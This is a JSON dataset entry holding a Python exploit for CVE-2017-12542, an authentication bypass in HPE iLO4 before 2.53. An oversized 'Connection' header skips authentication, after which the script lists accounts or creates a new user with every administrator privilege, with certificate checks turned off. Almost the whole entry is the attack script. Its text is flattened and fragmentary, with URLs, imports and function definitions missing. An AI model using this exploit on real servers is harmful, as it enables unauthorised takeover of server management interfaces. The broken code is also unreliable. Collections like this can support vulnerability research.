{
    "text": "vul_name : HPE iLO4 < 2.53 Add New Administrator User ， vul_cve : CVE-2017-12542 ， vul_poc :  #  ! /usr/bin/env python ， \" ， Exploit trigger was presented @ reconbrx 2018 ， Vulnerability found and documented by synacktiv :  ， Original advisory from HP :  ， Other advisories for this CVE :  ， IMPORTANT :  ， THIS EXPLOIT IS JUST FOR ONE OUT OF THE THREE VULNERABILITES COVERED BY CVE-2017-12542 !  ， The two other vulns are critical as well , but only triggerable on the host itself. ， \" ， from requests.packages.urllib3.exceptions import InsecureRequestWarning ，  # all of the HP iLO interfaces run on HTTPS , but most of them are using self-signed SSL cert ， urllib3.disable_warnings ( urllib3.exceptions.InsecureRequestWarning )  ， requests.packages.urllib3.disable_warnings ( InsecureRequestWarning )  ， exploit_trigger = {'Connection' : 'A' * 29} ， accounts_url = ' ， url = accounts_url % ip ， response = requests.get ( url , headers = exploit_trigger , verify = False )  ， data = json.loads ( response.text )  ， Oem = { ， 'Hp' : { ， 'LoginName' : username ,  ， 'Privileges' : { ， 'LoginPriv' : True ,  ， 'RemoteConsolePriv' : True ,  ， 'UserConfigPriv' : True ,  ， 'VirtualMediaPriv' : True ,  ， 'iLOConfigPriv' : True ,  ， 'VirtualPowerAndResetPriv' : True ,  ， } ， } ， } ， body = { ， 'UserName' : username ,  ， 'Password' : password ,  ， 'Oem' : Oem ， } ， url = accounts_url % ip ， response = requests.post ( url , json=body , headers = exploit_trigger , verify = False )  ， parser = argparse.ArgumentParser ( description='CVE-2017-12542 Tester and Exploiter script.' )  ， parser.add_argument ( 'ip' , help='target IP' )  ， parser.add_argument ( '-t' , action='store_true' , default=True , help='Test. Trigger the exploit and list all users' )  ， parser.add_argument ( '-e' , action='store_true' , default=False , help='Exploit. Create a new admin user with the credentials specified in -u and -p' )  ， parser.add_argument ( '-u' , help='username of the new admin user' )  ， parser.add_argument ( '-p' , help='password of the new admin user' )  ， args = parser.parse_args (  )  ， print ( 'Username and password must be set for exploiting ! ' )  ， sys.exit (  )  ， res , data = exploit ( args.ip , args.u , args.p )  ， print ( ' [ + ] Sucsessfully added user ! ' )  ， print ( ' [ - ] Error ! %s' % data )  ， elif args.t :  ， res , data = test ( args.ip )  ， print ( ' [ + ] Target is VULNERABLE ! ' )  ， print ( ' [ + ] Account name : %s Username : %s' % ( i [ 'Name' ]  , i [ 'Oem' ]  [ 'Hp' ]  [ 'LoginName' ]  )  ， print ( ' [ - ] Error ! %s' % data ) ",
    "time": "2018.02.08"
}